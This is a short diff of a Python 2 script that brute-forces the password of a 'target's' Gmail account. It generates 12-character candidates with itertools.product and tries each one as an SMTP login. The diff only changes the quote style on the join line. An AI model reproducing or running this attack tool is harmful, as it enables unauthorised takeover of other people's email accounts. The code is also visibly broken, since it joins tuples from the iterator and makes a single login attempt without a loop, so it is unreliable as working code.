@@ -9,7 +9,7 @@ smtpserver.starttls()
 user = raw_input("Enter Target's Gmail Address: ") 
 
 perm = itertools.product("abcdefghijklmnopqrstuvwxyz1234567890", repeat=12)
-password = "".join(perm)
+password = ''.join(perm)
          
 try: 
     smtpserver.login(user, password) 
